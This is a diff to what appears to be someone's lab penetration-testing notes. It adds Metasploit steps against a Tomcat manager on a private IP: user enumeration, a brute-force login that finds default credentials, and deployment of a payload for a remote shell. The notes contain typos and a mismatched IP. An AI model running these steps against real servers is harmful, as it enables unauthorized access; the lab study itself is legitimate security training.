@@ -217,7 +217,50 @@ https://www.exploit-db.com/exploits/5720
 ---
  search msf for vulnarabiltiy , found RCE that need to be authenticated so we will attemp a brute force searching for weak credentials
  
+ use auxiliary/scanner/http/tomcat_enum
  
+ set Rhost 192.168.1.9
+ 
+ set targeturi /maanger
+ 
+ set rport 8180
+ 
+ run 
+ 
+ [+] http://192.168.1.9:8180/manager - Users found: admin, both, manager, role1, root, tomcat
+ 
+
+use auxiliary/scanner/http/tomcat_mgr_login 
+
+ set username tomcat
+ 
+ run 
+ 
+ [+] 192.168.1.19:8180 - Login Successful: tomcat:tomcat
+
+ use exploit/multi/http/tomcat_mgr_deploy
+ 
+set Rhost 192.168.1.9
+ 
+ set targeturi /manager
+ 
+ run 
+ 
+ now we've got our credential lets move for the shell
+ 
+ use exploit/multi/http/tomcat_mgr_deploy
+ 
+ set RHost 192.168.1.9
+
+ set RPORT 8180 
+
+ set httpusername tomcat
+
+ set httppasword tomcat
+
+ run 
+ 
+ now we have our shell and can attend a prev esclication as the way we did with postgress above
  
  
  
